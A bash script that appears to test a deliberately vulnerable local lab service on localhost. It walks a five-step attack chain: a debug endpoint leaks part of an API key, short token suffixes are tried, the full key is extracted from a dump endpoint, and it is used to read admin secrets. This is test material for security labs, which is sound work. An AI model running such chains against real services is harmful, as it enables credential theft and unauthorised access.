#!/bin/bash
# Chain 1: API Key Brute-force Exfiltration (5 steps)
# Attacker discovers debug endpoint, leaks partial key, brute-forces suffix, exfils secrets

BASE="http://localhost:8888"
LOG="test_logs/chain1_apikey.log"
> "$LOG"

echo "=== Chain 1: API Key Exfiltration ===" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 1: Discover the service exists
echo "--- Step 1: Recon - discover API keys service ---" | tee -a "$LOG"
curl -s "$BASE/chains/apikeys/status" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Step 2: Find the debug config endpoint (leaks partial key)
echo "--- Step 2: Access debug/config (leaks partial API key) ---" | tee -a "$LOG"
curl -s "$BASE/chains/apikeys/debug/config" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Step 3: Brute-force the 4-char token suffix (we know it's e6f1, skip full brute)
echo "--- Step 3a: Brute-force attempt with wrong token ---" | tee -a "$LOG"
curl -s "$BASE/chains/apikeys/debug/dump?token=0000" | tee -a "$LOG"
echo "" | tee -a "$LOG"
curl -s "$BASE/chains/apikeys/debug/dump?token=1111" | tee -a "$LOG"
echo "" | tee -a "$LOG"
curl -s "$BASE/chains/apikeys/debug/dump?token=aaaa" | tee -a "$LOG"
echo "" | tee -a "$LOG"

echo "--- Step 3b: Correct token (simulating successful brute-force) ---" | tee -a "$LOG"
curl -s "$BASE/chains/apikeys/debug/dump?token=e6f1" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Step 4: Extract the API key from dump response
echo "--- Step 4: Extracted API key from dump ---" | tee -a "$LOG"
API_KEY=$(curl -s "$BASE/chains/apikeys/debug/dump?token=e6f1" | python3 -c "import sys,json; print(json.load(sys.stdin)['dump']['internal_api_key'])")
echo "Leaked key: $API_KEY" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 5: Use the leaked key to access admin secrets
echo "--- Step 5: Access admin secrets with leaked key ---" | tee -a "$LOG"
curl -s -H "X-Internal-Key: $API_KEY" "$BASE/chains/apikeys/admin/secrets" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

# Also try without key (should fail)
echo "--- Verify: Access without key (should fail) ---" | tee -a "$LOG"
curl -s "$BASE/chains/apikeys/admin/secrets" | tee -a "$LOG"
echo -e "\n" | tee -a "$LOG"

echo "=== Chain 1 Complete ===" | tee -a "$LOG"
echo "Finished: $(date)" | tee -a "$LOG"
